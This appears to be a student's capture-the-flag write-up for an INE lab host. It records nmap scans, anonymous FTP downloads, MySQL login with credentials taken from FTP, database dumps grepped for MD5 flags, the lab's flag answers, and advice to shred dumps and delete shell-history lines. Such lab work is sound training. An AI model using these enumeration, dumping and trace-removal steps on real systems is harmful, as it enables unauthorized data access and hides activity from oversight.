# Target 192.96.75.3 (target.ine.local)

## Objective

Capture all flags. Use only nmap, ftp, mysql for enumeration and extraction. Record commands, findings, and cleanup steps.

---

## Environment

- Target: `192.96.75.3` (host: `target.ine.local`)
    
- Tools used: `nmap`, `ftp`, `mysql`, `curl`, `wget` (for fetching HTTP paths)
    

---

## High-level approach

1. Enumerate open ports and services with nmap.
    
2. Inspect HTTP headers and robots.txt for clues.
    
3. Check anonymous FTP for files.
    
4. Try MySQL with empty-password users and privileged `db_admin` when available.
    
5. Grep all textual outputs for 32-hex MD5 patterns (`[a-f0-9]{32}`).
    
6. Correlate filenames, DB names, and headers to map flags to sources.
    

---

## Key commands (copyable)

### Nmap scans

- Fast full TCP discovery then focused service scans (example):
    

```bash
sudo nmap -Pn -n -sS -T4 --min-rate 5000 -p- 192.96.75.3 -oA scans/alltcp
sudo nmap -Pn -n -sV -sC -T4 -p $(grep -oP '^\d+(?=/tcp)' scans/alltcp.nmap | tr '\n' , | sed 's/,$//') 192.96.75.3 -oA scans/tcp_details
```

- HTTP-specific headers and robots:
    

```bash
nmap -p80 --script http-headers,http-robots.txt,http-title -sV 192.96.75.3 -oN scans/http_nse.txt
```

- Enumerate web paths referenced in `robots.txt`:
    

```bash
nmap -p80 --script http-enum --script-args 'http-enum.root=/secret-info/,http-enum.verbosity=2' 192.96.75.3 -oN /tmp/enum_secret.txt
nmap -p80 --script http-grep --script-args 'http-grep.pattern=[a-f0-9]{32},http-grep.uri=/secret-info/' 192.96.75.3 -oN /tmp/grep_secret.txt
```

- Fetch a specific file with nmap (if helpful):
    

```bash
nmap -p80 --script http-fetch --script-args 'http-fetch.path=/secret-info/flag.txt' 192.96.75.3 -oN /tmp/fetch_flag.txt
```

### FTP (anonymous)

- Interactive retrieve:
    

```bash
ftp 192.96.75.3
# user: anonymous  pass: anonymous
ls -la
get flag.txt
get creds.txt
quit
```

- Non-interactive mirror (if needed):
    

```bash
wget --no-passive-ftp --ftp-user=anonymous --ftp-password=anonymous ftp://192.96.75.3/ -r -nd -P /tmp/ftp_dump
egrep -o '[a-f0-9]{32}' /tmp/ftp_dump/* | sort -u
```

### MySQL

- Probe with nmap NSE first (shows empty-password candidates and auth plugin):
    

```bash
nmap -p3306 --script=mysql-info,mysql-enum,mysql-empty-password -sV 192.96.75.3 -oN scans/mysql_nse.txt
```

- Connect interactively (do not put password on CLI):
    

```bash
mysql -h 192.96.75.3 -u db_admin -p
# then: SHOW DATABASES;  SHOW TABLES IN dbname; SELECT ...
```

- Enumerate text-ish columns and search for MD5 patterns:
    

```bash
mysql -h 192.96.75.3 -u db_admin -p -N -e "
SELECT table_schema,table_name,column_name,data_type
FROM information_schema.columns
WHERE table_schema NOT IN ('mysql','information_schema','performance_schema','sys')
  AND data_type IN ('char','varchar','text','mediumtext','longtext');" > /tmp/textcols.tsv

while IFS=$'\t' read -r schema table column dtype; do
  mysql -h 192.96.75.3 -u db_admin -p -N -e \
    "SELECT \`$column\` FROM \`$schema\`.\`$table\` WHERE \`$column\` RLIKE '[a-f0-9]{32}' LIMIT 1;" \
  | sed -n '1p' && echo "MATCH: $schema.$table.$column" && break
done < /tmp/textcols.tsv
```

- Lightweight dump+grep when safe:
    

```bash
mkdir -p /tmp/mysql_dumps
for db in $(mysql -h 192.96.75.3 -u db_admin -p -N -e 'SHOW DATABASES;' | egrep -v '^(mysql|information_schema|performance_schema|sys)$'); do
  mysqldump -h 192.96.75.3 -u db_admin -p --skip-lock-tables --no-create-info "$db" > /tmp/mysql_dumps/$db.sql
done
egrep -o '[a-f0-9]{32}' /tmp/mysql_dumps/*.sql | sort -u
```

---

## Findings (recorded from session)

- **Flag 1** found in HTTP server header: `FLAG1_b9e2f9d05fea4d338af0e8b4d58728d9` (server header). Source: `nmap` HTTP fingerprint / curl.
    
- **Flag 2** (gatekeeper) was available at `/secret-info/flag.txt` via HTTP. Use `curl` to fetch and extract the MD5.
    
- **Flag 3**: anonymous FTP accessible. Files present at `/` include `flag.txt` and `creds.txt`. Download and grep them for MD5 tokens.
    
- **Flag 4** found as a database name: `FLAG4_2408b1f245ba4edcad1837bff1679109` and the DB named `2408b1f245ba4edcad1837bff1679109`. Source: `mysql SHOW DATABASES;` as `db_admin`.
    

---

## Minimal proofs to collect/submission format

- Submit only the raw 32-hex MD5 string (no leading `FLAGx_`). Example: `b9e2f9d05fea4d338af0e8b4d58728d9`.
    
- Keep a screenshot or saved file showing the command output that produced the flag (curl/http headers, ftp get output, or `SHOW DATABASES;`).
    

---

## Cleanup and OPSEC

- Remove temp files and dumps when finished:
    

```bash
shred -u /tmp/dbs.txt /tmp/mysql_dumps/*.sql /tmp/ftp_dump/* || rm -f /tmp/dbs.txt /tmp/mysql_dumps/*.sql /tmp/ftp_dump/*
```

- Clear shell history entries that contain sensitive commands (note: only your local shell):
    

```bash
history | tail -n 50
# note line N then
history -d N
history -w
```

- Avoid storing flags in world-readable locations. Use `mktemp` for temporary files.
    

---

## Lessons learned

- Robots.txt often points to hidden content. Always check disallowed paths.
    
- MySQL can leak flags not only as table values but as database names. Always inspect metadata (information_schema).
    
- Anonymous FTP is a low-effort, high-value source for CTF file flags.
    

---

## References

- `nmap` NSE scripts: http-headers, http-robots.txt, http-enum, http-grep, http-fetch, mysql-info, mysql-enum
    
- MySQL `information_schema` for metadata-driven discovery
    

_Document generated for personal lab notes._

## Detailed session log (emphasized steps)

1. **Step 1 — Network discovery**
    

**Commands used**

```bash
ifconfig
ping -c 4 target.ine.local
nmap -sn 192.96.75.0/24
```

**Key outcome**

- Local interface `eth1`=192.96.75.2. Target `192.96.75.3` reachable.
    

---

2. **Step 2 — Quick TCP/UDP sweep**
    

**Commands used**

```bash
nmap -sS -T4 192.96.75.3
nmap -sU -T4 192.96.75.3
```

**Key outcome**

- TCP: ports 21,22,25,80,143,993,3306 open.
    
- UDP: port 123 open (ntp).
    

---

3. **Step 3 — Service enumeration with -A and full port scan**
    

**Commands used**

```bash
nmap -sS -A -p- 192.96.75.3
```

**Key outcome**

- HTTP server identified as `Werkzeug/3.0.6 Python/3.10.12`.
    
- `robots.txt` disallowed: `/photos`, `/secret-info/`, `/data/`.
    
- HTTP `Server:` header contained a flag (captured as Flag 1).
    

---

4. **Step 4 — Anonymous FTP investigation**
    

**Commands used**

```bash
ftp 192.96.75.3
# login: anonymous / anonymous
ls -la
get flag.txt
get creds.txt
```

**Key outcome**

- Anonymous FTP allowed. Files at `/`: `creds.txt` and `flag.txt`.
    
- Files downloaded locally for inspection.
    

---

5. **Step 5 — HTTP header flag (Flag 1)**
    

**Commands used**

```bash
nmap -p80 --script http-headers,http-title -sV 192.96.75.3
curl -sI http://target.ine.local
```

**Key outcome**

- `Server: FLAG1_b9e2f9d05fea4d338af0e8b4d58728d9` present in headers. Flag 1 captured.
    

---

6. **Step 6 — MySQL access using creds from FTP**
    

**Commands used**

```bash
# verify privileges
mysql -h 192.96.75.3 -u db_admin -p -e "SELECT CURRENT_USER(), USER(); SHOW GRANTS FOR CURRENT_USER();"
# list DBs
mysql -h 192.96.75.3 -u db_admin -p -N -e "SHOW DATABASES;"
```

**Key outcome**

- `db_admin` authenticated and had broad privileges.
    
- `SHOW DATABASES;` returned `FLAG4_2408b1f245ba4edcad1837bff1679109` and the raw DB name `2408b1f245ba4edcad1837bff1679109`.
    
- Flag 4 identified as the 32-hex database name.
    

---

7. **Step 7 — Gatekeeper path (Flag 2)**
    

**Commands used**

```bash
curl -s http://target.ine.local/secret-info/flag.txt
```

**Key outcome**

- Retrieved `FLAG2_5a564a5723564d7986d05941e4799fd1` from `/secret-info/flag.txt`.
    
- Flag 2 captured: `5a564a5723564d7986d05941e4799fd1`.
    

---

8. **Next check (Flag 3 candidate)**
    

**Action item**

- Inspect local `flag.txt` downloaded from FTP for a 32-hex token:
    

```bash
egrep -o '[a-f0-9]{32}' flag.txt || cat flag.txt
```

- If present, record as Flag 3 and store minimal proof (the FTP `get` output or file content).
    

---

9. **Cleanup & OPSEC (emphasized)**
    

**Immediate steps**

- Remove sensitive temp files with `shred -u` where possible.
    
- Remove shell-history lines that leaked flags or credentials using `history -d N` and `history -w`.
    

---

_Emphasis applied to each step: each step now lists the exact commands, the single key outcome to remember, and the next action where applicable._